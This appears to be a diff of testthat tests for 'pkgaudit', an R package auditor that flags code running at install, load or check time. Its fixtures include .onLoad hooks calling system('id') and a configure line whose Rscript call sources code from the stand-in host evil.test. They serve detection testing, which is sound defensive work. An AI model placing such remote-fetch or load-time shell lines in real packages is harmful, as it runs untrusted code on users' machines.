@@ -1,15 +1,15 @@
 rules <- load_rules()
 
 # structure --------------------------------------------------------------------
-test_that("audit_package() returns a pkgaudit object of five frames plus metadata", {
+test_that("audit_package() returns a pkgaudit object of six frames plus metadata", {
   pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
   on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
 
   res <- audit_package(pkg, rules)
   expect_s3_class(res, "pkgaudit")
-  expect_named(res, c("file_contexts", "code_contexts", "patterns",
-                      "matches", "errors", "metadata"))
-  for (nm in c("file_contexts", "code_contexts", "patterns", "matches",
+  expect_named(res, c("file_contexts", "patterns", "matches", "coverage",
+                      "errors", "metadata"))
+  for (nm in c("file_contexts", "patterns", "matches", "coverage",
                "errors")) {
     expect_s3_class(res[[nm]], "data.frame")
   }
@@ -17,12 +17,10 @@ test_that("audit_package() returns a pkgaudit object of five frames plus metadat
 
   expect_named(res$file_contexts,
                c("rule", "file_context", "message", .phase_columns))
-  expect_named(res$code_contexts,
-               c("rule", "file_context", "line_number", "column_number",
-                 "message", .phase_columns))
   expect_named(res$patterns,
                c("rule", "file_context", "line_number", "column_number",
-                 "code_context", "guarded", "preview", "message", "attck",
+                 "code_context", "guarded", "indirect", "preview", "message",
+                 "attck",
                  .phase_columns))
   expect_named(res$matches,
                c("rule", "file_context", "line_number", "column_number",
@@ -47,16 +45,12 @@ test_that("audit_package() resolves the phases of every finding", {
   expect_true(configure$at_check)
   expect_false(configure$at_load)
 
-  # A code context takes its phases from its own rule, so .onLoad() adds at_load
-  # to the phases that install it.
-  onload <- res$code_contexts[res$code_contexts$rule == "onLoad_base", ]
-  expect_true(onload$at_load)
-  expect_true(onload$at_install_src)
-
-  # A pattern inherits the phases of the code context it sits in: the hook's
-  # system() call runs at load, the one in an ordinary function runs never.
+  # A pattern takes the phases of the code context it sits in, so .onLoad()
+  # adds at_load to the phases that install it, and code in an ordinary
+  # function runs at no phase at all.
   hook <- res$patterns[res$patterns$code_context == "onLoad_base", ]
   expect_true(all(hook$at_load))
+  expect_true(all(hook$at_install_src))
 
   uncalled <- res$patterns[res$patterns$code_context == "Other", ]
   expect_equal(nrow(uncalled), 1L)
@@ -93,7 +87,7 @@ test_that("audit_package() finds file contexts, code contexts and patterns", {
 
   expect_setequal(res$file_contexts$file_context,
                   c("configure", "src/Makevars", "src/install.libs.R"))
-  expect_true("onLoad_base" %in% res$code_contexts$rule)
+  expect_true("onLoad_base" %in% res$patterns$code_context)
 
   # system() in the hook, source() at top level, system2() at top level of
   # install.libs.R -> the three code-context labels are attributed correctly.
@@ -102,11 +96,11 @@ test_that("audit_package() finds file contexts, code contexts and patterns", {
   expect_equal(sys_hook$code_context, "onLoad_base")
 
   src_top <- res$patterns[res$patterns$rule == "source", ]
-  expect_equal(src_top$code_context, "Top-level")
+  expect_equal(src_top$code_context, "R")
 
   installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
   expect_equal(installlibs$rule, "system")
-  expect_equal(installlibs$code_context, "Top-level")
+  expect_equal(installlibs$code_context, "R")
 
   expect_equal(nrow(res$errors), 0L)
 })
@@ -132,7 +126,6 @@ test_that("audit_package() on a package with no scannable content is empty", {
 
   res <- audit_package(pkg, rules)
   expect_equal(nrow(res$file_contexts), 0L)
-  expect_equal(nrow(res$code_contexts), 0L)
   expect_equal(nrow(res$patterns), 0L)
   expect_equal(nrow(res$matches), 0L)
   expect_equal(nrow(res$errors), 0L)
@@ -434,7 +427,7 @@ test_that("a help-file preview shows the extracted code, not the .Rd text", {
 # is never called. Reporting it as onLoad_base would be a false attribution, not
 # a cautious one, so the named hook rules are withheld where the code does not
 # become the namespace.
-test_that("a lifecycle hook outside R/ is not reported as a code context", {
+test_that("a lifecycle hook outside R/ is not attributed to a hook", {
   hook <- c(".onLoad <- function(libname, pkgname) {", "  system('id')", "}")
   pkg  <- make_pkg(files = list(
     "R/zzz.R"             = hook,
@@ -445,8 +438,9 @@ test_that("a lifecycle hook outside R/ is not reported as a code context", {
   res <- audit_package(pkg, rules)
 
   # R/ builds the namespace, so the hook there is a hook.
-  expect_equal(res$code_contexts$file_context[res$code_contexts$rule == "onLoad_base"],
-               "R/zzz.R")
+  zzz <- res$patterns[res$patterns$file_context == "R/zzz.R", ]
+  expect_equal(zzz$code_context, "onLoad_base")
+  expect_true(zzz$at_load)
 
   # The identical code under src/ is still scanned -- the system() call is
   # reported -- but attributed to the file it sits in, not to a hook.
@@ -474,13 +468,13 @@ test_that("top-level code takes the code context its file-context rule names", {
   res <- audit_package(pkg, rules)
   ctx <- setNames(res$patterns$code_context, res$patterns$file_context)
 
-  expect_equal(ctx[["R/zzz.R"]],       "Top-level")
-  expect_equal(ctx[["data/things.R"]], "data_R")
-  expect_equal(ctx[["demo/intro.R"]],  "demo_R")
-  expect_equal(ctx[["tests/setup.R"]], "test_R")
-  expect_equal(ctx[["tools/build.R"]], "tools_R")
-  expect_equal(ctx[["inst/CITATION"]], "citation_R")
-  expect_equal(ctx[[".Rprofile"]],     "rprofile_R")
+  expect_equal(ctx[["R/zzz.R"]],       "R")
+  expect_equal(ctx[["data/things.R"]], "data")
+  expect_equal(ctx[["demo/intro.R"]],  "demo")
+  expect_equal(ctx[["tests/setup.R"]], "tests")
+  expect_equal(ctx[["tools/build.R"]], "tools")
+  expect_equal(ctx[["inst/CITATION"]], "citation")
+  expect_equal(ctx[[".Rprofile"]],     "Rprofile")
 })
 
 test_that("each file-type context carries its own measured phases", {
@@ -530,7 +524,7 @@ test_that("a testthat or tinytest file is scanned but its fixtures are not", {
     c("tests/testthat/test-a.R", "tests/testthat/helper-a.R",
       "inst/tinytest/test_a.R")
   )
-  expect_true(all(res$patterns$code_context == "test_R"))
+  expect_true(all(res$patterns$code_context == "tests"))
 })
 
 # Sexpr stages and guarded code ------------------------------------------------
@@ -711,7 +705,7 @@ test_that("code under exec/ runs at no lifecycle phase", {
   res <- audit_package(pkg, rules)
   # Not Top-level: that would confer build, check and install_src phases on code
   # nothing in the lifecycle runs.
-  expect_equal(res$patterns$code_context, "exec_R")
+  expect_equal(res$patterns$code_context, "exec")
   expect_false(any(unlist(res$patterns[, .phase_columns])))
 })
 
@@ -731,4 +725,37 @@ test_that("exec/ files in languages pkgaudit does not read are not scanned", {
   expect_equal(nrow(res$patterns), 0L)
   expect_equal(nrow(res$matches),  0L)
   expect_equal(nrow(res$errors),   0L)
+})
+
+# Rscript, and the other test locations ----------------------------------------
+test_that("an Rscript invocation is reported wherever it is written", {
+  pkg <- make_pkg(files = list(
+    "configure"    = "${R_HOME}/bin/Rscript -e 'source(\"https://evil.test/x\")'",
+    "src/Makevars" = "PKG_LIBS := $(shell $(R_HOME)/bin/Rscript -e \"flags()\")"
+  ))
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
+
+  res <- audit_package(pkg, rules)
+  expect_setequal(res$matches$rule[res$matches$rule == "rscript"],
+                  c("rscript", "rscript"))
+  expect_setequal(res$matches$file_context[res$matches$rule == "rscript"],
+                  c("configure", "src/Makevars"))
+  # The R inside -e is not parsed; the invocation is what a reviewer follows.
+  expect_false("source" %in% res$patterns$rule)
+})
+
+test_that("RUnit and legacy testthat locations are scanned as test code", {
+  pkg <- make_pkg(files = list(
+    "inst/unitTests/runit.audit.R" = "system('id')",
+    "inst/tests/test-audit.R"      = "system('id')"
+  ))
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
+
+  res <- audit_package(pkg, rules)
+  expect_setequal(res$patterns$file_context,
+                  c("inst/unitTests/runit.audit.R", "inst/tests/test-audit.R"))
+  expect_true(all(res$patterns$code_context == "tests"))
+  expect_true(all(res$patterns$at_check))
+  # Scanned, not reported: they are R, and parsed.
+  expect_equal(nrow(res$file_contexts), 0L)
 })
